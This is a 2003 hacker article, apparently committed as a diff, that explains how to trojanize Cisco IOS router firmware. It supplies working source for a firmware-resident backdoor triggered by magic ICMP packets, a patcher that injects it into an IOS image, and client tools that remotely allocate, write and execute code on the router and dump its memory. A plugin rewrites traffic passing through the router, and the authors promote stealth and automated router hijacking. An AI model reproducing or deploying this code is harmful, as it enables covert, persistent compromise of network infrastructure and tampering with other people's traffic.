@@ -1,0 +1,980 @@
+                                                               _   _:.
+                                                                :$$$$$
+         _   .     - +.                                        :l$³³$$
+   s¿¿,,_  +:@QSSS$$$$$                                         ``
+   $$$$$$$$bs¿.`"Ù?$$$l       [ CISCO GAMES ]
+   'ÀÀ?$$³$$$$b¿_  .        [ copyrite 2003 eblakr & madcr ]
+            `"À$³$b.   .     [ while writing this article, ]
+                  `À?b.  `.   [ no one router died ]
+                     `Ù.   +
+                      `$   _.
+                        `
+
+
+ ABSTRACT
+ --------
+
+     This article describes cisco ios modification technology:
+     how to patch ios code and what to inject inside;
+     how to upgrade ios functionality and how then to upload
+     and execute inside of the router arbitrary code.
+
+     However, we are lazy enough to describe everything detailed.
+
+ CONTENTS
+ --------
+
+     INTRO
+     TECHNOLOGY
+     FORMAT AND LAYOUT
+       CHECKSUMS
+     DISASSEMBLING
+       FREESPACE
+       SUBROUTINES
+     BACKDOOR
+     CONTROL
+     TOOLS
+     PLUGINS
+     FUTURE
+     USED STUFF
+
+     ipttl.lst
+     backdoor.s
+     apply_bd.cpp
+     ciscolib.cpp
+     sendcode.cpp
+     mdump.cpp
+     console.s
+     plugin.c
+
+ INTRO
+ -----
+
+     Imagine that you have full access to some remote router.
+     If you want to change routing scheme (just a bit),
+     does it means that you must edit config?
+     How stealth your actions can be?
+     Should you even login?
+
+     Cisco IOS has one bad feature: there is no legal way to upload
+     arbitrary code (plugin) into router's memory.
+     This means that you only can operate with predefined set of tools.
+
+     This is very sad fact, and let cisco systems be cursed for that.
+
+     So we thinked about it and found that there exists a solution
+     that could be (and is already) practically realized:
+     just to add own features (as well as ability to add more features)
+     into that fucking ios code.
+
+     In two words, we patch ios image, inject there small backdoor
+     and then update router flash.
+     I.e. our backdoor is located in the system flash.
+
+     As a result, our backdoor can sniff each packet passed through
+     (or coming into) the router, and then we send to (or via) the
+     router some special packets containing big "plugin" which
+     is handled by the backdoor and executed inside routers r/w memory.
+     I.e. main plugin(s) are in ram, and must be uploaded
+     on each reload.
+
+ TECHNOLOGY
+ ----------
+
+     This section describes everything step-by-step.
+
+     1  Initial IOS modification
+     1.1  Somehow get full access to some router (out of subject)
+     1.2  Download ios
+     1.3  Modify ios
+     1.3.1  Unpack (optional)                   [see: FORMAT AND LAYOUT]
+     1.3.2  Disassemble                         [see: DISASSEMBLING]
+     1.3.3  Find subroutines to be hooked       [see: SUBROUTINES]
+     1.3.4  Find (organize) free space          [see: FREESPACE]
+     1.3.5  Patch (inject backdoor)             [see: BACKDOOR]
+     1.3.6  Checksum image                      [see: CHECKSUMS]
+     1.3.7  Pack (optional)                     [see: FORMAT AND LAYOUT]
+     1.4  Upload ios
+     1.5  Reload router (sad but true)
+     2  Remote control                          [see: CONTROL]
+     2.1  Remote side (backdoored router)       [see: BACKDOOR]
+     2.1.1  Analyze each packet we can sniff (*), check "our" signature
+     2.1.2  Using control codes, do some basic actions, such as
+            read memory, write memory, malloc, free,
+            and exec code at given location;
+            if required, insert "reply" into the packet and fix crc
+     2.2  Local side (where haxors are)         [see: PLUGIN]
+     2.2.1  Write and compile C (or maybe asm) program, extract plain code
+     2.2.2  Upload this program into the router, using the following
+            sequence of backdoor calls: malloc, write, exec  [see: CONTROL]
+     2.2.3  When C code is executed in the router's memory,
+            it patches so-called callback
+            (which is organized by the backdoor),  [see: BACKDOOR]
+            and then it has access to each packet handled by the router (*)
+
+     (*) Packet handling is available ONLY if software commutation
+     method is used; so this all is only applicable to low-end models.
+
+
+ FORMAT AND LAYOUT
+ -----------------
+
+     There are at least three ios formats: AOUT, ELF, ECOFF.
+
+     AOUT format is not packed, just checksummed.
+
+     ELF format exists in two forms: packed and unpacked.
+
+     When packed, image consists of
+     1. tiny unzipper in elf format
+     2. header, containing 5 motorola-ordered dwords:
+        0xFEEDFACE, uncomp size, comp size, comp checksum, uncomp checksum
+     3. ZIP file, containing real image in unpacked elf format
+
+     Header checksum: (code for motorola-ordered platforms)
+
+     unsigned long cisco_crc(unsigned char* buf, unsigned long len)
+     {
+       unsigned long crc = 0;
+       for(unsigned long t = 0; t < (len >> 2); t++)
+       {
+         unsigned long r8 = *(unsigned long*)&buf[ t*4 ]; // use htonl on intel
+         crc += r8;
+         if (crc < r8)
+           crc += 1;
+       }
+       return crc;
+     } // cisco_crc
+
+     Some images are relocatable (containing relocations), other are not.
+     This probably depends on where image is to be executed:
+     directly in the flash, or copied into ram.
+
+     Note, that CPU_type fields are replaced by perverted cisco programmers
+     with own values.
+
+ CHECKSUMS
+ ---------
+
+     All these fucking formats has tons of checksums, which are strangely
+     calculated (using file format) and stored into headers,
+     .text segment, and etc.
+
+ DISASSEMBLING
+ -------------
+
+     Can be performed using IDA, or some automatic instruction analyzer,
+     especially in case of RISC cpu's.
+
+     In case of AOUT, ida sometimes do not understand the format;
+     but you can define segments manually.
+     Except that, dont forget to choose cpu type correctly.
+
+ FREESPACE
+ ---------
+
+     There are tons of text strings in the ios images, which are used
+     very seldom, so we can always cut some big message to free some
+     space for our backdoor.
+
+ SUBROUTINES
+ -----------
+
+     One of the main problems is to find and correctly choose subroutine
+     to hook packets on. This depends on many factors.
+
+     To find out these subroutines while disassembling, you can
+     use debug strings. For example, enable packet dumping within your
+     router and then search for corresponding format strings within your
+     image.
+
+     When required subroutines are found, you can keep signatures
+     (initial bytes) to use 'em in the future;
+     moreover, this all can be automated. [see: FUTURE]
+
+     Some images has interesting feature: subroutine-related
+     text messages are always placed before that subroutine.
+
+ BACKDOOR
+ --------
+
+     Lets focus on 2501 cisco image.
+     Image has an AOUT format, cpu is motorola 68030.
+
+     There should be some subroutine in the code that works with ip crc field.
+     Because when packet is routed, ttl is decremented, something
+     else can be changed, and etc.
+
+     This subroutine is called ipttl(): it decrements ttl in the packet
+     and fixes crc knowing that just 1 byte were decremented.
+
+     [see ipttl.lst]
+
+     As you can see, at location __patch_1 we can insert jump (bra.l)
+     to some other place, where backdoor's code is located.
+
+     As such, our backdoor will receive pointer to the packet
+     in the a0 register.
+
+     But, since our code can be located in the read-only memory,
+     we need some variable, to keep root of the packet hook chain,
+     or just a single callback address.
+     Later, uploaded plugins will use this callback variable to
+     easily setup itself as a packet handler, not knowing about
+     backdoor specifics.
+     This could be dword at 0x000134EC, it were found somehow,
+     seems to be unused and initially set to zero.
+
+     Here is backdoor's source:
+
+     [see backdoor.s]
+
+     After backdoor is compiled, we need the following proggy to perform
+     the patch (to compile use msvc):
+
+     [see apply_bd.cpp]
+
+     As you can see, function addresses are used directly;
+     but this can be easily automated.
+
+ CONTROL
+
+     After IOS image is patched, checksummed and uploaded,
+     we can try to play with the router.
+
+     We will use the following control packet format:
+
+     +00  45 00 00 ll   ver:4=0x4  len:4=0x5  tos:8=0x00  len:16=?
+     +04  zz zz 00 00   id:16=zzzz  offs:16=0x0000
+     +08  FF 01 xx xx   ttl:8=255   proto:8=0x01=icmp  csum:16=xxxx
+     +0C  ss ss ss ss   src:32
+     +10  dd dd dd dd   dst:32
+     +14  08 00 yy yy   type:8=0x08=icmp echo  code:8=0x00   csum:16=yyyy
+     +18  aa aa bb bb   id:16=aaaa   seq:16=bbbb
+     +1C    MAGIC_IN    NOTE: on reply set to MAGIC_OUT
+     +20  00 00 00 cc   code := 1=malloc 2=readmem 3=writemem  4=exec  5=free
+     +24  ss ss ss ss   size, in BYTE's; malloc/readmem/writemem=any, exec/free: unused
+     +28  aa aa aa aa   address; malloc: used on reply, readmem/writemem/exec/free: address
+     +2C  dd dd dd dd   data; malloc/free: unused, readmem/writemem: any
+     +30  dd dd dd dd
+     +34  dd dd dd dd
+     +38  dd dd dd dd
+     +3C  ...
+
+     We can now use the following hi-level subroutines to
+     remotely access our backdoor:
+
+     [see ciscolib.cpp]
+
+     And now, using these hi-level subroutines we can write a tool
+     which will upload plugin into the router and execute it:
+
+     [see sendcode.cpp]
+
+ TOOLS
+ -----
+
+     Here is memory dumper, based on hi-level backdoor io functions.
+
+     [see mdump.cpp]
+
+     It allows you to remotely dump cisco memory contents.
+
+     In theory, using the same method it is possible to dump
+     internal memory structures, which can help you in writing sploits.
+
+ PLUGINS
+ -------
+
+     Minimal plugin in asm looks like following:
+
+     [see console.s]
+
+     It will directly call printf_to_console subroutine,
+     and if you have access to the router's console you will see the text
+     appeared on the screen; if you dont, router owners will see,
+     and we can only imagine how they can be surprised.
+
+     But really, plugin is to be written in C.
+     This allows you to use the same C code for any router,
+     platform- and backdoor-independend.
+
+     Another plugin is more complicated:
+     it is written in C and hooks all packets using backdoor's callback
+     (can be changed into hook chain)
+
+     Once packet appeared, it scans for 'soft' and replaces it with 'fuck',
+     and then recalculates packet checksums.
+
+     The only troubl is to write position-independend code in C.
+
+     Except that, i have stupid gcc compiler (for 68030 cpu)
+     which uses jsr instead of bsr command;
+     which results in position-dependend code.
+     This can be fixed by compiling via assembly, and changing
+     all bsr commands into jsr within intermediate assembly file.
+
+     [see plugin.c]
+
+ FUTURE
+ ------
+
+     Knowing addresses of corresponding ios subroutines,
+     you can call 'em and generate own packets,
+
+     drop incoming packets,
+
+     change contents of the packets passing via router,
+
+     you can call ios engine which processes shell commands,
+     as such you will have ability to control router
+     without logging in.
+
+     You can change traffic statistics.
+
+     You can implement different stealth technologies there,
+     so only external statistical methods could disclose you.
+
+     You can do everything your can only imagine.
+
+     Except internal perspectives, there exists possibilities of
+     automated router hacking and trojanizing,
+     which can result in the total network whatever-you-can-think.
+
+     Could it happen?
+
+
+ USED STUFF
+ ----------
+
+     1. Cisco IOS(R) Reference Guide, (c) 1999 Cisco Systems, Inc.
+     2. Cisco IOS Programmer's Guide/Architecture Reference, stealed
+     3. some old xxx sources, stealed
+     4. AOUT format, various sources
+     5. Executable and Linkable Format (ELF), various sources
+     6. instruction set manuals for different cpu's
+     7. some handy tools like ida and gcc/msvc
+
+ ipttl.lst
+ ---------
+
+03192F22                     ; int __cdecl ipttl(int packet)
+03192F22                     ipttl:
+03192F22
+03192F22                     packet          =  4
+03192F22
+03192F22 206F 0004                           movea.l packet(sp),a0
+03192F26
+03192F26                     loc_3192F26:
+03192F26 0C28 0001 0008                      cmpi.b  #1,ip_packet.ttl(a0)
+03192F2C 6300 0026                           bls.w   loc_3192F54
+03192F30
+03192F30                     loc_3192F30:
+03192F30 5328 0008                           subq.b  #1,ip_packet.ttl(a0)
+03192F34
+03192F34                     __patch_1:
+03192F34 3028 000A                           move.w  $A(a0),d0
+03192F38 0640 0100                           addi.w  #$100,d0
+03192F3C 6400 0004                           bcc.w   loc_3192F42
+03192F40 5240                                addq.w  #1,d0
+03192F42
+03192F42                     loc_3192F42:
+03192F42 0C40 FFFF                           cmpi.w  #-1,d0
+03192F46 6600 0004                           bne.w   loc_3192F4C
+03192F4A 7000                                moveq   #0,d0
+03192F4C
+03192F4C                     loc_3192F4C:
+03192F4C 3140 000A                           move.w  d0,ip_packet.csum(a0)
+03192F50 7000                                moveq   #0,d0
+03192F52 4E75                                rts
+03192F54
+03192F54                     loc_3192F54:
+03192F54 7001                                moveq   #1,d0
+03192F56 4E75                                rts
+03192F56                     ; End of function ipttl
+
+ backdoor.s
+ ----------
+
+| cisco=2501 ios=11.3(3) format=aout cpu=68030 subroutine=ipttl()
+
+#include        "../common.hpp"
+.text
+                dc.l    BD_START_SIGN                   | start of BACKDOOR code
+.x_start:
+
+| ipttl() jmps here
+
+| %a0 = 4(%sp) = packet
+| %d0 = packet.ttl - 1
+
+                move.l  (0x000134EC).l, %a1             | check if hook()
+                tst.l   %a1                             | is installed
+                beq.s   .end_of_hook                    |
+
+                move.l  %a0, -(%sp)                     | packet for hook() != 0
+                jsr     (%a1)                           | hook()
+                addq.l  #4, %sp                         | fix stack
+
+                move.l  4(%sp), %a0                     | restore a0 = packet
+
+                tst.l   %d0                             | check result:
+                bne.w   .good_return_from_ipttl         | 1 = packet handled
+                | 0 = continue with packet
+.end_of_hook:
+
+                cmp.b   #0x45, iph_versionlength(%a0)   | ip.len == 20 ?
+                bne.s   .return
+                cmp.w   #min_ctlpacket_size, iph_length(%a0) | len >= min_ctlpacket_size ?
+                blt.s   .return
+                cmp.b   #PROTO_ICMP, iph_protocol(%a0)  | IP.proto == ICMP ?
+                bne.s   .return
+                cmp.l   #MAGIC_IN, offs_magic(%a0)      | magic ?
+                bne.s   .return
+
+                bra.s   .my_packet                      | handle my packet
+
+| exec 2 original instructions and return to ipttl()
+| this is because we replace em with bra.l to backdoor start
+
+.return:
+
+                move.w  iph_checksum(%a0), %d0          | from ipttl()
+                add.w   #0x100, %d0                     | --//--
+
+                bra.l   back_from_backdoor              | back to ipttl()
+.p1:
+
+.my_packet:
+                move.l  #MAGIC_OUT, offs_magic(%a0)     | change magic
+
+                move.l  offs_size(%a0), %d1             | d1 = size
+                move.l  offs_addr(%a0), %a1             | a1 = addr
+
+                move.l  offs_cmd(%a0), %d0              | d0 = cmd
+
+                sub.l   #1, %d0
+                beq.s   .malloc
+                sub.l   #1, %d0
+                beq.s   .read
+                sub.l   #1, %d0
+                beq.s   .write
+                sub.l   #1, %d0
+                beq.s   .exec
+                sub.l   #1, %d0
+                beq.s   .free
+
+                bra.s   .recrc
+
+.malloc:
+                move.l  %d1, -(%sp)                     | size for malloc()
+                bsr.l   malloc                          | allocate memory
+.p2: | .pN means that previous DWORD is patched by apply_bd.cpp
+                add.l   #4, %sp                         | fix stack
+
+                move.l  4(%sp), %a0                     | restore a0 = packet
+                move.l  %d0, offs_addr(%a0)             | store address
+
+                bra.s   .recrc                          | recalc crc & return
+
+.free:
+                move.l  %a1, -(%sp)                     | addr for free()
+                bsr.l   free                            | free memory
+.p3:
+                add.l   #4, %sp                         | fix stack
+
+                bra.s   .recrc                          | recalc crc & return
+
+.read:
+                add.l   #offs_data, %a0                 | a0 = data
+
+.copy:          | %a1=src, %a0=dst, %d1=size
+
+                move.b  (%a1)+, (%a0)+                  | copy byte, inc a0/a1
+                sub.l   #1, %d1                         | decrement counter
+                tst.l   %d1                             | continue if d1 != 0
+                bne.s   .copy
+                                                        | recalc crc & return
+                bra.s   .recrc
+.write:
+                move.l  %a0, %a1                        | a1 = packet
+                add.l   #offs_data, %a1                 | a1 = data
+                move.l  offs_addr(%a0), %a0             | a0 = addr
+
+                bra.s   .copy                           | go to copy cycle
+.exec:
+                move.l  %a1, -(%sp)                     | size for malloc()
+                pea     (0x000134EC).l                  | hook-dword addr
+                clr.l   -(%sp)                          | 0
+                jsr     (%a1)                           | call code at addr
+                add.l   #12, %sp                        | fix stack
+
+|               bra.s   .recrc                          | recalc crc & return
+
+.recrc:
+                move.l  4(%sp), %a0                     | restore a0 = packet
+
+                clr.w   icmph_csum(%a0)                 | icmp csum = 0
+                clr.l   %d0                             | d0 = 0
+                move.w  iph_length(%a0), %d0            | d0 = packet length
+                add.l   #20, %a0                        | a0 = ICMP hdr
+                sub.l   #20, %d0                        | d0 = ICMP len
+                move.l  %d0, -(%sp)                     | len for ipcrc()
+                move.l  %a0, -(%sp)                     | addr for ipcrc()
+                bsr.l   ipcrc                           | calc icmp csum
+.p4:
+                add.l   #8, %sp                         | fix stack
+                move.l  4(%sp), %a0                     | restore a0 = packet
+                move.w  %d0, icmph_csum(%a0)            | store icmp csum
+
+                clr.w   iph_checksum(%a0)               | ip csum = 0
+                pea     (20).w                          | len for ipcrc()
+                move.l  %a0, -(%sp)                     | addr for ipcrc()
+                bsr.l   ipcrc                           | calc ip csum
+.p5:
+                add.l   #8, %sp                         | fix stack
+                move.l  4(%sp), %a0                     | restore a0 = packet
+                move.w  %d0, iph_checksum(%a0)          | store ip csum
+
+.good_return_from_ipttl:
+                move    #0, %d0                         | from ipttl()
+                rts                                     | --//--
+
+                dc.l    BD_END_SIGN                     | end of BACKDOOR code
+                dc.l    .p1-.x_start-4                  | patch: bra.l back_from_backdoor
+                dc.l    .p2-.x_start-4                  | patch: bsr.l malloc
+                dc.l    .p3-.x_start-4                  | patch: bsr.l free
+                dc.l    .p4-.x_start-4                  | patch: bsr.l ipcrc
+                dc.l    .p5-.x_start-4                  | patch: bsr.l ipcrc
+
+| EOF
+
+ apply_bd.cpp
+ ------------
+
+#include "../common.hpp"
+
+DWORD BSWAP(DWORD x)
+{
+  return (x>>24)|(x<<24)|((x&0xFF00)<<8)|((x&0xFF0000)>>8);
+}
+
+void main(int argc, char* argv[])
+{
+  if (argc != 3)
+  {
+    printf("syntax: apply_bd ios.bin backdoor.o\n");
+    exit(0);
+  }
+
+  char* ios_fname = argv[1];
+  char* bd_fname  = argv[2];
+
+  FILE*f=fopen(ios_fname,"rb");
+  assert(f);
+  int ios_len = filelength(fileno(f));
+  BYTE* ios_buf = new BYTE[ ios_len+1 ];
+  assert(ios_buf);
+  assert(fread(ios_buf,1,ios_len,f)==ios_len);
+  fclose(f);
+
+  DWORD ios_unused = 0, ios_malloc = 0, ios_free = 0, ios_ipcrc = 0, ios_ipttl = 0;
+
+  ios_unused = 0x005A5206;  // free space addr
+  ios_malloc = 0x001827A6;
+  ios_free   = 0x00183E5A;
+  ios_ipcrc  = 0x00192DC0;
+  ios_ipttl  = 0x00192EE2;
+
+  printf("IOS: unused at phys=0x%08X virt=0x%08X\n", ios_unused, 0x03000040+ios_unused);
+  printf("IOS: malloc at phys=0x%08X virt=0x%08X\n", ios_malloc, 0x03000040+ios_malloc);
+  printf("IOS: free   at phys=0x%08X virt=0x%08X\n", ios_free  , 0x03000040+ios_free  );
+  printf("IOS: ipcrc  at phys=0x%08X virt=0x%08X\n", ios_ipcrc , 0x03000040+ios_ipcrc );
+  printf("IOS: ipttl  at phys=0x%08X virt=0x%08X\n", ios_ipttl , 0x03000040+ios_ipttl );
+
+  assert(ios_unused && ios_malloc && ios_free && ios_ipcrc && ios_ipttl);
+
+  assert(memcmp(ios_buf+ios_ipttl,
+                   "\x20\x6F\x00\x04"          // movea.l 4(sp),a0
+                   "\x0C\x28\x00\x01\x00\x08"  // cmpi.b #1, 8(a0)
+                   "\x63\x00\x00\x26"          // bls.w ...
+                   "\x53\x28\x00\x08"          // subq.b #1, 8(a0)
+                   "\x30\x28\x00\x0A"          // move.w $A(a0), d0
+                   "\x06\x40\x01\x00",26)==0); // addi.w #$100, d0
+
+  f=fopen(bd_fname,"rb");
+  assert(f);
+  int bd_len = filelength(fileno(f));
+  BYTE* bd_buf = new BYTE[ bd_len+1 ];
+  assert(bd_buf);
+  assert(fread(bd_buf,1,bd_len,f)==bd_len);
+  fclose(f);
+
+  DWORD bd_start = 0, bd_end = 0;
+  for(DWORD t=0; t<bd_len; t++)
+  {
+    if (*(DWORD*)&bd_buf[t] == BD_START_SIGN) bd_start = t+4;
+    if (*(DWORD*)&bd_buf[t] == BD_END_SIGN  ) bd_end   = t;
+  }
+  assert(bd_start && bd_end);
+
+  printf("bd size = %d\n", bd_end - bd_start);
+
+  // bra.l unused
+  ios_buf[ios_ipttl+0x12] = 0x60;
+  ios_buf[ios_ipttl+0x13] = 0xFF;
+  *(DWORD*)&ios_buf[ios_ipttl+0x14] = BSWAP( ios_unused - (ios_ipttl+0x14) );
+  // nop
+  ios_buf[ios_ipttl+0x18] = 0x4E;
+  ios_buf[ios_ipttl+0x19] = 0x71;
+
+  // copy backdoor body
+  memcpy(ios_buf+ios_unused, bd_buf+bd_start, bd_end-bd_start);
+
+  // fix .p1 -- bra.l back_from_backdoor
+  t = BSWAP(*(DWORD*)&bd_buf[bd_end+4]);
+  *(DWORD*)&ios_buf[ios_unused+t] = BSWAP( (ios_ipttl+0x18) - (ios_unused+t) );
+
+  // fix .p2 -- bsr.l malloc
+  t = BSWAP(*(DWORD*)&bd_buf[bd_end+8]);
+  *(DWORD*)&ios_buf[ios_unused+t] = BSWAP( ios_malloc - (ios_unused+t) );
+
+  // fix .p3 -- bsr.l free
+  t = BSWAP(*(DWORD*)&bd_buf[bd_end+12]);
+  *(DWORD*)&ios_buf[ios_unused+t] = BSWAP( ios_free - (ios_unused+t) );
+
+  // fix .p4 & .p5 -- bsr.l ipcrc
+  t = BSWAP(*(DWORD*)&bd_buf[bd_end+16]);
+  *(DWORD*)&ios_buf[ios_unused+t] = BSWAP( ios_ipcrc - (ios_unused+t) );
+  t = BSWAP(*(DWORD*)&bd_buf[bd_end+20]);
+  *(DWORD*)&ios_buf[ios_unused+t] = BSWAP( ios_ipcrc - (ios_unused+t) );
+
+  // store patched file
+
+  f=fopen(ios_fname,"wb");
+  assert(f);
+  assert(fwrite(ios_buf,1,ios_len,f)==ios_len);
+  fclose(f);
+
+  printf("IOS patched OK\n");
+
+} // main
+
+ ciscolib.cpp
+ ------------
+
+DWORD cisco_malloc(DWORD size)
+{
+  return cisco_io(CMD_MALLOC, size, 0, NULL);
+} // cisco_malloc()
+
+BOOL cisco_read(DWORD addr, OUT BYTE* data, IN DWORD size)
+{
+  return cisco_io(CMD_READ, size, addr, data);
+} // cisco_read()
+
+BOOL cisco_write(DWORD addr, IN BYTE* data, IN DWORD size)
+{
+  return cisco_io(CMD_WRITE, size, addr, data);
+} // cisco_write()
+
+BOOL cisco_exec(DWORD addr)
+{
+  return cisco_io(CMD_EXEC, 0, addr, NULL);
+} // cisco_exec()
+
+BOOL cisco_free(DWORD addr)
+{
+  return cisco_io(CMD_FREE, 0, addr, NULL);
+} // cisco_free()
+
+DWORD cisco_io(DWORD cmd, DWORD size, DWORD addr, BYTE* data)
+{
+//  printf("dbg:cmd=%d size=%d addr=0x%08X data=%08X\n", cmd,size,addr,data);
+
+  IPHeader* iph = (IPHeader*) temp_buf;
+  iph->iph_verlen = 0x45;
+  iph->iph_tos    = 0;
+  iph->iph_len    = ntohs(min_ctlpacket_size+(cmd==CMD_MALLOC?0:size));
+  iph->iph_id     = htons(0x1122);
+  iph->iph_offset = htons(0);
+  iph->iph_ttl    = 255;
+  iph->iph_proto  = IPPROTO_ICMP;
+  iph->iph_csum   = htons(0);
+  iph->iph_src    = inet_addr(MASTER_ADDR);
+  iph->iph_dst    = inet_addr(REMOTE_ADDR);
+
+  BYTE* icmp = (BYTE*)&temp_buf[ 20 ];
+  icmp[0] = 8;    // type = echo
+  icmp[1] = 0;    // code = unused
+  *(WORD*)&icmp[2] = htons(0);      // csum
+  *(WORD*)&icmp[4] = htons(0x3344); // id
+  *(WORD*)&icmp[6] = htons(0x5566); // seq
+
+  *(DWORD*)&temp_buf[offs_magic] = htonl(MAGIC_IN);
+  *(DWORD*)&temp_buf[offs_cmd  ] = htonl(cmd);
+  *(DWORD*)&temp_buf[offs_size ] = htonl(size);
+  *(DWORD*)&temp_buf[offs_addr ] = htonl(addr);
+  if (data != NULL)
+  memcpy(&temp_buf[offs_data], data, size);
+
+  ... now checksum temp_buf ...
+
+  ... now send temp_buf into the net ...
+
+  DWORD time_0 = GetTickCount();
+
+  for(;;)
+  {
+    ... now receive packet into temp_buf ...
+
+    if (temp_buf != NULL)
+    {
+      IPHeader* iph = (IPHeader*) temp_buf;
+      if (iph->iph_proto == IPPROTO_ICMP)
+      if (*(DWORD*)&temp_buf[offs_magic] == htonl(MAGIC_OUT))
+      {
+
+        DWORD res;
+        if (cmd == CMD_MALLOC) // malloc
+          res = ntohl(*(DWORD*)&temp_buf[offs_addr]);
+        if (cmd == CMD_READ) // read
+          memcpy(data, &temp_buf[offs_data], size);
+
+        if (cmd == CMD_MALLOC) // malloc
+          return res;
+
+        return 1;
+
+      }
+    }
+
+    if (GetTickCount() - time_0 > MAX_TIMEOUT)
+    {
+      printf("ERROR: cisco_io: timeout expired\n");
+      break;
+    }
+
+  }//for(;;)
+
+  return 0;
+
+} // cisco_io
+
+ sendcode.cpp
+ ------------
+
+#include "ciscolib.cpp"
+
+int main(int argc, char* argv[])
+{
+  assert(argc==2);
+
+  assert(cisco_init() == TRUE);
+
+  FILE*f=fopen(argv[1],"rb");
+  assert(f);
+  static BYTE sh[1048576];
+  int len = filelength(fileno(f));
+  assert(fread(sh,1,len,f)==(unsigned)len);
+  fclose(f);
+
+  DWORD a1 = cisco_malloc(len);
+  // now backdoor in the router allocated len bytes for us and we get pointer into a1
+  printf("a1 = %08X\n", a1);
+  assert(a1 != 0);
+
+  assert(cisco_write(a1, sh, len) == TRUE);
+
+  BYTE* d = new BYTE[ len ];
+  assert(d);
+  memset(d, 0x55, len);
+  assert(cisco_read(a1, d, len) == TRUE);
+
+  if (memcmp(d, sh, len) != 0)
+  {
+    printf("ERROR: data mismatch\n");
+    exit(0);
+  }
+
+  assert(cisco_exec(a1) == TRUE);
+  printf("exec... ok?...\n");
+
+//  assert(cisco_free(a1) == TRUE);
+
+  assert(cisco_done() == TRUE);
+
+  printf("All OK\n");
+
+}//main
+
+ mdump.cpp
+ ---------
+
+#include "ciscolib.cpp"
+
+void help()
+{
+  printf("syntax: mdump [options] hex_startoffset <Lhex_length|hex_endoffset>\n");
+  printf("options:\n");
+  printf("  -con  write to console\n");
+  printf("  -log  write _mdump.log\n");
+  printf("  -bin  write _mdump.bin\n");
+  exit(0);
+}
+
+int main(int argc, char* argv[])
+{
+
+  char* a_offs = 0;
+  char* a_len  = 0;
+  int   opt_log = 0, opt_bin = 0, opt_con = 0;
+  FILE*f, *o;
+
+  for(int q=1; q<argc; q++)
+  {
+    if (!stricmp(argv[q],"-log")) opt_log=1; else
+    if (!stricmp(argv[q],"-bin")) opt_bin=1; else
+    if (!stricmp(argv[q],"-con")) opt_con=1; else
+    if (a_offs==0) a_offs=argv[q]; else
+    if (a_len==0) a_len=argv[q]; else
+      help();
+  }
+  if ((a_offs == 0) || (a_len == 0)) help();
+  if ((opt_log+opt_bin+opt_con)==0) help();
+
+  DWORD offs=0, size=0;
+
+  assert(sscanf(a_offs, "%X", &offs)==1);
+  if ((a_len[0]|32) == 'l')
+  {
+    if (sscanf(((char*)argv[2])+1, "%X", &size)!=1) help();
+  }
+  else
+  {
+    if (sscanf(a_len, "%X", &size)!=1) help();
+    size -= offs;
+  }
+
+  assert(cisco_init() == TRUE);
+
+#define CH(x)   ((((x)==0)||((x)==0x0D)||((x)==0x0A)||((x)==0x09)||((x)==0x07))?32:(x))
+
+  if (opt_log)
+  {
+    f=fopen("_mdump.log","wb");
+    assert(f);
+  }
+  if (opt_bin)
+  {
+    o=fopen("_mdump.bin","wb");
+    assert(o);
+  }
+
+  int np=0;
+  for(DWORD t=offs; t<offs+size; )
+  {
+    static BYTE d[1024];
+
+    int sz = (offs+size-t) > 1024 ? 1024 : (offs+size-t);
+
+    memset(d,0x00,sizeof(d));
+    assert(cisco_read(t, d, sz) == TRUE);
+    np++;
+
+    static char s[4096];
+
+    if (opt_con || opt_log)
+    for(int z=0; z<sz; z+=16)
+    {
+      sprintf(s,"%08X:  %02X %02X %02X %02X  %02X %02X %02X %02X  %02X %02X %02X %02X  %02X %02X %02X %02X  %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n",
+        t+z,
+
+        d[z+ 0],d[z+ 1],d[z+ 2],d[z+ 3],
+        d[z+ 4],d[z+ 5],d[z+ 6],d[z+ 7],
+        d[z+ 8],d[z+ 9],d[z+10],d[z+11],
+        d[z+12],d[z+13],d[z+14],d[z+15],
+
+        CH(d[z+ 0]),CH(d[z+ 1]),CH(d[z+ 2]),CH(d[z+ 3]),
+        CH(d[z+ 4]),CH(d[z+ 5]),CH(d[z+ 6]),CH(d[z+ 7]),
+        CH(d[z+ 8]),CH(d[z+ 9]),CH(d[z+10]),CH(d[z+11]),
+        CH(d[z+12]),CH(d[z+13]),CH(d[z+14]),CH(d[z+15])
+       );
+
+      if (opt_con) printf("%s",s);
+      if (opt_log) fprintf(f,"%s",s);
+    }//for z
+
+    if (opt_bin) assert(fwrite(d,1,sz,o)==(unsigned)sz);
+
+    t += sz;
+  }
+
+  if (opt_log) fclose(f);
+  if (opt_bin) fclose(o);
+
+  assert(cisco_done() == TRUE);
+
+  printf("done, used %d io cycles\n", np);
+
+}//main
+
+ console.s
+ ---------
+
+#include        "../common.hpp"
+.text
+                dc.l    BD_START_SIGN                   | start of MAIN code
+.x_start:
+                dc.w    0x487A      | some form of PEA, i cant pass to as.exe
+.x:             dc.w    .msg - .x   |
+
+                pea.l   (0xFFFFFFFE).w
+                move.l  #0x03127E44, %a1                | printf to console
+                jsr     (%a1)
+                add.l   #8, %sp
+                rts
+.msg:
+                .ascii  "\15\12-= c1sco backd00r =-\15\12\0"
+                dc.l    BD_END_SIGN                     | end of MAIN code
+| EOF
+
+
+ plugin.c
+ --------
+
+int x_code(BYTE* packet,      // NULL for exec() call, ptr to packet if hook
+           DWORD* hook_addr,  // valid only if packet == NULL
+           DWORD own_addr)    // --//--
+{
+  if (packet == NULL)
+  {
+    // 1st call -- override callback
+    *hook_addr = own_addr;
+  }
+  else
+  {
+    // hooked packet
+    IPHeader* hdr = (IPHeader*) packet;
+    if (hdr->iph_verlen == 0x45)
+    if ((hdr->iph_proto == 0x06) || (hdr->iph_proto == 0x11))
+    {
+      for(DWORD i=20; i<hdr->iph_len-4; i++)
+      {
+        if (packet[i+0]=='s')
+        if (packet[i+1]=='o')
+        if (packet[i+2]=='f')
+        if (packet[i+3]=='t')
+        {
+          *(DWORD*)&packet[i+0] = 'fuck';
+          checksum_TCP(packet, hdr->iph_len);
+          checksum_IP(packet);
+          return 1;
+        }
+      }
+    }
+  }
+  return 0;
+} // x_code
+
+<EOF>
